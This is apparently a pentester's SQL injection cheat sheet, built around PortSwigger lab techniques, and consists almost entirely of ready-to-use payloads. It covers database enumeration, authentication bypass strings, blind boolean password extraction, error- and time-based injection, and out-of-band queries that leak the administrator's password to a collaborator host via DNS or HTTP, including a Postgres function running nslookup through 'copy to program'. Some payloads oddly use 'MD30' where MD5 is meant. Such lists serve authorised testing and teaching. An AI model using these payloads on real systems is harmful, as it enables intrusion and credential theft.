## SQLi Cheatsheet
Generic Overview:

- https://portswigger.net/web-security/sql-injection/cheat-sheet

Specialized CheatSheets:

- [PayloadsAllTheThings Postgres SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

- [PayloadsAllTheThings MySQL SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

- [PayloadsAllTheThings Oracle SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)

- [PayloadsAllTheThings MsSQL SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)

## Version Enumeration
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- (Oracle)
'+UNION+SELECT+@@version,+NULL# (Windows & MSSql)
'+UNION+SELECT+version()# (Postgres)
```

## Column Count Enumeration
```
'+UNION+SELECT+NULL,NULL-- (non oracle)
'+UNION+SELECT+'a','b'+FROM+dual-- (oracle)
```

## Table Enumeration
```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- (non oracle)
'+UNION+SELECT+table_name,NULL+FROM+all_tables-- (oracle)
'UNION+SELECT+*+FROM+information_schema.tables-- (PostgreSQL / MySQL)

```

## Column Details Enumeration
```
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- (non oracle)
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- (oracle)
```

## Retrieve Data
```
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef-- (non oracle)
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- (oracle)
```

## Boolean Queries
Send a boolean query that shows an error if the result is true
```
Oracle:
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

PostgreSQL:
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)

Microsoft:
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END

MySQL:
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
```

## Auth Bypass
```
administrator'--
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```
## Trigger Out-of-Band interactions
The following payloads will trigger an out of band interaction to your collaborator
```
Example Query:
TrackingIdCookie=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

Oracle:
SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual

If the Oracle installation is updated, then the following may work (if privs have been elevated)
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')

Postgres:
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'

Windows:
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'

MySQL (only works on Windows)
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```
If the external interaction is possible, then user credential information can be retrieved with the payload below. The password should be returned as the subdomain of the dns/http query in collaborator
```
Example Query:
TrackingIdCookie=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

Oracle:
SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual

Postgres:
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f()

Microsoft:
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')

MySQL (only works on Windows):
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

## Blind SQLi to guess passwords
Find a potentially vulnerable cookie in a BURP response. The page difference may be minimal, so check the site for text that only appears if a statement is true/false.
Cookie Example:
```
TrackingId=xyz' AND '1'='1 (true)
TrackingId=xyz' AND '1'='2 (false)
```
Next you will need to guess the table name and potential user names. Again, we attempt to verify the information with a true/false statement that confirms our guess:
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
Now we need to guess the password length. The following statement should return as true and enables you to increase the length until you find the limit:
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
Next you will need to identify each letter using BURP intruder. The letters can be enumerated using the following query:
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
etc.
```
## Visibile Error based SQLi
Find a vulnerable injection point like a cookie in a BURP request. The injection point can be identified as vulnerable by adding a ' after the cookie. If the error disappears with '-- then continue.

Send a query that returns as a int data type
```
' AND CAST((SELECT 1) AS int)-- (this should error stating that a boolean is required)
' AND 1=CAST((SELECT 1) AS int)-- (this should be valid without any errors)
```
The query can now be adjusted to retrieve usernames. If you receive an error due to character limits then remove parts (or all) of the cookie. You may also need to limit the values to one column.
```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
If the above is successful, then the password can then be retrieved with the following query:
```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
## Time based payloads
These payloads may require string concatenation before the the value in BURP Intruder. The sleep time has been set to 30 seconds, so responses should stand out in the BURP window. 
```
sleep(30)#
1 or sleep(30)#
" or sleep(30)#
' or sleep(30)#
" or sleep(30)="
' or sleep(30)='
1) or sleep(30)#
") or sleep(30)="
') or sleep(30)='
1)) or sleep(30)#
")) or sleep(30)="
')) or sleep(30)='
;waitfor delay '0:0:30'--
);waitfor delay '0:0:30'--
';waitfor delay '0:0:30'--
";waitfor delay '0:0:30'--
');waitfor delay '0:0:30'--
");waitfor delay '0:0:30'--
));waitfor delay '0:0:30'--
'));waitfor delay '0:0:30'--
"));waitfor delay '0:0:30'--
benchmark(10000000,MD30(1))#
1 or benchmark(10000000,MD30(1))#
" or benchmark(10000000,MD30(1))#
' or benchmark(10000000,MD30(1))#
1) or benchmark(10000000,MD30(1))#
") or benchmark(10000000,MD30(1))#
') or benchmark(10000000,MD30(1))#
1)) or benchmark(10000000,MD30(1))#
")) or benchmark(10000000,MD30(1))#
')) or benchmark(10000000,MD30(1))#
pg_sleep(30)--
1 or pg_sleep(30)--
" or pg_sleep(30)--
' or pg_sleep(30)--
1) or pg_sleep(30)--
") or pg_sleep(30)--
') or pg_sleep(30)--
1)) or pg_sleep(30)--
")) or pg_sleep(30)--
')) or pg_sleep(30)--
AND (SELECT * FROM (SELECT(SLEEP(30)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(30)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(30)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(30)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(30)))nQIP)#
SLEEP(30)#
SLEEP(30)--
SLEEP(30)="
SLEEP(30)='
or SLEEP(30)
or SLEEP(30)#
or SLEEP(30)--
or SLEEP(30)="
or SLEEP(30)='
waitfor delay '00:00:030'
waitfor delay '00:00:030'--
waitfor delay '00:00:030'#
benchmark(300000000,MD30(1))
benchmark(300000000,MD30(1))--
benchmark(300000000,MD30(1))#
or benchmark(300000000,MD30(1))
or benchmark(300000000,MD30(1))--
or benchmark(300000000,MD30(1))#
pg_SLEEP(30)
pg_SLEEP(30)--
pg_SLEEP(30)#
or pg_SLEEP(30)
or pg_SLEEP(30)--
or pg_SLEEP(30)#
'\"
AnD SLEEP(30)
AnD SLEEP(30)--
AnD SLEEP(30)#
&&SLEEP(30)
&&SLEEP(30)--
&&SLEEP(30)#
' AnD SLEEP(30) ANd '1
'&&SLEEP(30)&&'1
ORDER BY SLEEP(30)
ORDER BY SLEEP(30)--
ORDER BY SLEEP(30)#
(SELECT * FROM (SELECT(SLEEP(30)))ecMj)
(SELECT * FROM (SELECT(SLEEP(30)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(30)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(3000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3000000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Generic Error based SQLi Payloads
 ```
OR 1=1
 OR 1=0
 OR x=x
 OR x=y
 OR 1=1#
 OR 1=0#
 OR x=x#
 OR x=y#
 OR 1=1-- 
 OR 1=0-- 
 OR x=x-- 
 OR x=y-- 
 OR 3409=3409 AND ('pytW' LIKE 'pytW
 OR 3409=3409 AND ('pytW' LIKE 'pytY
 HAVING 1=1
 HAVING 1=0
 HAVING 1=1#
 HAVING 1=0#
 HAVING 1=1-- 
 HAVING 1=0-- 
 AND 1=1
 AND 1=0
 AND 1=1-- 
 AND 1=0-- 
 AND 1=1#
 AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='
 AND 1083=1083 AND (1427=1427
 AND 7506=9091 AND (5913=5913
 AND 1083=1083 AND ('1427=1427
 AND 7506=9091 AND ('5913=5913
 AND 7300=7300 AND 'pKlZ'='pKlZ
 AND 7300=7300 AND 'pKlZ'='pKlY
 AND 7300=7300 AND ('pKlZ'='pKlZ
 AND 7300=7300 AND ('pKlZ'='pKlY
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 AS INJECTX WHERE 1=1 AND 1=1#
 AS INJECTX WHERE 1=1 AND 1=0#
 AS INJECTX WHERE 1=1 AND 1=1--
 AS INJECTX WHERE 1=1 AND 1=0--
 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1#
 WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 ORDER BY 11-- 
 ORDER BY 12-- 
 ORDER BY 13-- 
 ORDER BY 14-- 
 ORDER BY 15-- 
 ORDER BY 16-- 
 ORDER BY 17-- 
 ORDER BY 18-- 
 ORDER BY 19-- 
 ORDER BY 20-- 
 ORDER BY 21-- 
 ORDER BY 22-- 
 ORDER BY 23-- 
 ORDER BY 24-- 
 ORDER BY 25-- 
 ORDER BY 26-- 
 ORDER BY 27-- 
 ORDER BY 28-- 
 ORDER BY 29-- 
 ORDER BY 30-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 
 ORDER BY 11# 
 ORDER BY 12# 
 ORDER BY 13# 
 ORDER BY 14# 
 ORDER BY 15# 
 ORDER BY 16# 
 ORDER BY 17# 
 ORDER BY 18# 
 ORDER BY 19# 
 ORDER BY 20# 
 ORDER BY 21# 
 ORDER BY 22# 
 ORDER BY 23# 
 ORDER BY 24# 
 ORDER BY 25# 
 ORDER BY 26# 
 ORDER BY 27# 
 ORDER BY 28# 
 ORDER BY 29# 
 ORDER BY 30#
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 3 
 ORDER BY 4 
 ORDER BY 5 
 ORDER BY 6 
 ORDER BY 7 
 ORDER BY 8 
 ORDER BY 9 
 ORDER BY 10 
 ORDER BY 11 
 ORDER BY 12 
 ORDER BY 13 
 ORDER BY 14 
 ORDER BY 15 
 ORDER BY 16 
 ORDER BY 17 
 ORDER BY 18 
 ORDER BY 19 
 ORDER BY 20 
 ORDER BY 21 
 ORDER BY 22 
 ORDER BY 23 
 ORDER BY 24 
 ORDER BY 25 
 ORDER BY 26 
 ORDER BY 27 
 ORDER BY 28 
 ORDER BY 29 
 ORDER BY 30 
 ORDER BY 31337 
 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
 and (select substring(@@version,1,1))='X'
 and (select substring(@@version,1,1))='M'
 and (select substring(@@version,2,1))='i'
 and (select substring(@@version,2,1))='y'
 and (select substring(@@version,3,1))='c'
 and (select substring(@@version,3,1))='S'
 and (select substring(@@version,3,1))='X'
```
